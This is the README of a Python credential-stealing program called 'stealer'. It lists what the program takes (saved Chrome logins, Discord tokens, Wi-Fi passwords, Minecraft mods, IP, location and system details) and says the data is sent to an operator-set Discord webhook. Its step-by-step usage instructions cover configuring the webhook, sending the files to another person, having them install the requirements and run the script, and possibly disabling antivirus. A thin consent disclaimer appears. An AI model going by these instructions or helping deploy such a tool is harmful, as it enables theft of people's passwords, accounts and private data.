# stealer
A program made in python. Grabs chrome login information, Minecraft mods (under 8mb), basic computer info and user info, discord tokens and sends to the discord webhook you set

THIS MAY REQUIRE THE PERSON RUNNING main.py TO DISABLE ANTIVIRUS

HOW TO USE: 

1: set your discord webhook in line 20 in the file main.py

2: save the file main.py

3: send main.py and requirements.txt to someone who has agreed to run it knowing what it will do

4: they then need to run the command: pip install -r requirements.txt (if they are on a POSIX or mac based machine not all requirements will be installed, they will have to manually install them, pywin32==304 wont be installed on mac or unix but this isnt a problem as the program wont run the code that requires this), they need to run this command in command prompt in the same directory as the requirements.txt file

5: tell them to run main.py, this will run the code and this content will be sent to your webhook:

  -Operating system

  -Public IP

  -Computer Name

  -Private IP

  -Cores

  -GPU

  -General ip location (WONT BE EXACT IT WILL BE GENERAL LOCATION)

  -Wifi passwords

  -All mods in minecraft mods folder (all under 8mb)

  -All saved chrome login details

  -All discord tokens




manual install steps for POSIX or mac based machines: 

pip install requests

pip install pycrypto

--installing pywin32==304 wont work as it only installs on windows, the code will check the os and run parts of code accordingly--
